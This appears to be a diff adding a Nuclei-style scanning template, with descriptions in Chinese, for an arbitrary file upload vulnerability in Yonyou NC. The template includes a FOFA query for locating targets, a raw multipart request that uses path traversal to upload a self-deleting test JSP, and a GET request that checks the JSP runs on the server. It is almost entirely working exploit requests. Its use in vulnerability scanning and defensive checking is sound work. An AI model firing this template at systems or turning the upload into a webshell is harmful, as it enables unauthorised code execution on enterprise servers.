@@ -1,0 +1,69 @@
+id: poc-tuemsruhg4mg65ls
+info:
+  name: 用友NC-uploadFile 接口存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tuemsruhg4mg65ls
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tuemsruhg4mg65ls
+    fofa: app="用友-NC-Cloud"
+http:
+- raw:
+  - 'POST /mp/login/../uploadControl/uploadFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/115.0.0.0 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 423
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept-Encoding: gzip, deflate
+
+
+    ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+
+    Content-Disposition: form-data; name="file"; filename="2fRUiHpYXAlhnydcAPOvDSvNkpW.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <%out.println("test321");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+
+    Content-Disposition: form-data; name="submit"
+
+
+    submit
+
+    ------WebKitFormBoundaryoDIsCqVMmF83ptmp--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /mp/uploadFileDir/2fRUiHpYXAlhnydcAPOvDSvNkpW.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/115.0.0.0 Safari/537.36
+
+    Connection: close
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
